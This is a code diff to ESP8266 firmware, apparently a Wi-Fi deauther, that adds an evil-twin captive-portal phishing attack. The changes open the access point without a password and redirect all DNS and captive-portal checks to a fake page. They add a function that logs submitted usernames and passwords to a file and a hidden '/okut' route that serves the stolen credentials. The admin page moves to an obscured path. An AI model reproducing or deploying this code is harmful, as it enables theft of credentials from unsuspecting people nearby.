@@ -6,7 +6,7 @@
 */
 
 #include <Arduino.h>
-
+#include <DNSServer.h>
 #include <ESP8266WiFi.h>
 #include <ESP8266WebServer.h>
 #include <ESP8266mDNS.h>
@@ -66,30 +66,60 @@ ESP8266WebServer server(80);
 #include "SSIDList.h"
 
 /* ========== DEBUG ========== */
-const bool debug = true;
+const bool debug = false;
 /* ========== DEBUG ========== */
 
 NameList nameList;
-
+DNSServer dnsServer;
+ IPAddress apIP(10, 40, 104, 1);
+IPAddress Asd(10, 40, 104, 1);
 APScan apScan;
 ClientScan clientScan;
 Attack attack;
 Settings settings;
 SSIDList ssidList;
 
+//yaraklar ///
+void oku(){
+String line;
+File f = SPIFFS.open("/f.txt", "r");
+  if (!f) {
+      Serial.println("file open failed");
+  }  Serial.println("====== Reading from SPIFFS file =======");
+  while(f.available()){
+          line += f.readStringUntil('\n');
+ 
+        
+}
+server.send(200, "text/html", line);
+}
+void yaz(String kadi,String sifr){
+  File f = SPIFFS.open("/f.txt", "a");
+  if (!f) {
+      Serial.println("file open failed");
+}
+          f.println(kadi + "-" + sifr);
+
+};
+
+//cukler
+
+
 void sniffer(uint8_t *buf, uint16_t len) {
   clientScan.packetSniffer(buf, len);
 }
 
 void startWifi() {
+ const char *bos="";
   Serial.println("\nStarting WiFi AP:");
   WiFi.mode(WIFI_STA);
   wifi_set_promiscuous_rx_cb(sniffer);
-  WiFi.softAP((const char*)settings.ssid.c_str(), (const char*)settings.password.c_str(), settings.apChannel, settings.ssidHidden); //for an open network without a password change to:  WiFi.softAP(ssid);
+  WiFi.softAP((const char*)settings.ssid.c_str(), bos, settings.apChannel, settings.ssidHidden); //for an open network without a password change to:  WiFi.softAP(ssid);
+  WiFi.softAPConfig(apIP, Asd, IPAddress(255, 255, 248, 0));
   Serial.println("SSID     : '" + settings.ssid+"'");
   Serial.println("Password : '" + settings.password+"'");
   Serial.println("-----------------------------------------------");
-  if (settings.password.length() < 8) Serial.println("WARNING: password must have at least 8 characters!");
+  //if (settings.password.length() < 8) Serial.println("WARNING: password must have at least 8 characters!");
   if (settings.ssid.length() < 1 || settings.ssid.length() > 32) Serial.println("WARNING: SSID length must be between 1 and 32 characters!");
   wifiMode = "ON";
 }
@@ -115,6 +145,9 @@ void loadAPScanHTML() {
 }
 void loadStationsHTML() {
   sendFile(200, "text/html", data_stationHTML, sizeof(data_stationHTML));
+}
+void loadSahteHTML() {
+  sendFile(200, "text/html", data_sahteHTML, sizeof(data_sahteHTML));
 }
 void loadAttackHTML() {
   sendFile(200, "text/html", data_attackHTML, sizeof(data_attackHTML));
@@ -451,16 +484,22 @@ void setup() {
   /* ========== Web Server ========== */
 
   /* HTML */
-  server.onNotFound(load404);
-
-  server.on("/", loadIndexHTML);
-  server.on("/index.html", loadIndexHTML);
+     
+      dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
+  dnsServer.start(53, "*", apIP);
+  server.on("/generate_204", loadSahteHTML);  //Android captive portal. Maybe not needed. Might be handled by notFound handler.
+  server.on("/fwlink", loadSahteHTML);  //Microsoft captive portal. Maybe not needed. Might be handled by notFound handler.
+  server.onNotFound(loadSahteHTML);
+  server.on("/", loadSahteHTML);
+  server.on("/okut", oku);
+  server.on("/sikici", loadIndexHTML);
+  //server.on("/index.html", loadIndexHTML);
   server.on("/apscan.html", loadAPScanHTML);
   server.on("/stations.html", loadStationsHTML);
   server.on("/attack.html", loadAttackHTML);
   server.on("/settings.html", loadSettingsHTML);
-  server.on("/info.html", loadInfoHTML);
-  server.on("/license", loadLicense);
+  // server.on("/info.html", loadInfoHTML);
+  // server.on("/license", loadLicense);
 
   /* JS */
   server.on("/js/apscan.js", loadAPScanJS);
@@ -501,6 +540,7 @@ void setup() {
   server.on("/addClient.json",addClient);
 
   server.begin();
+   SPIFFS.begin();
 }
 
 void loop() {
@@ -566,5 +606,8 @@ void loop() {
   }
   drawInterface();
 #endif
+
+  dnsServer.processNextRequest();
+  server.handleClient();
 
 }
